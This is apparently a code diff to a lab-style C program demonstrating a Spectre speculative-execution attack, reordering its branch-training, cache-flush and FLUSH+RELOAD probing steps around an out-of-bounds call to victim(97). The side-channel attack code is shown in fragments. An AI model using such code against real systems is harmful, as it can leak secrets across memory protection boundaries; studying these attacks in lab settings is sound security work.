@@ -1,6 +1,5 @@
 #include <emmintrin.h>
 #include <x86intrin.h>
-#include <stdlib.h>
 #include <stdio.h>
 #include <stdint.h>
 
@@ -46,18 +45,20 @@ void victim(size_t x)
 
 int main() {
   int i;
-  // FLUSH the probing array
-  flushSideChannel();
+
   // Train the CPU to take the true branch inside victim()
   for (i = 0; i < 10; i++) {   
-   _mm_clflush(&size); 
-   victim(i);
+     _mm_clflush(&size);
+     victim(i);
   }
+
+  // FLUSH the probing array
+  flushSideChannel();
+
   // Exploit the out-of-order execution
   _mm_clflush(&size);
-  for (i = 0; i < 256; i++)
-   _mm_clflush(&array[i*4096 + DELTA]); 
   victim(97);  
+
   // RELOAD the probing array
   reloadSideChannel();
   return (0); 
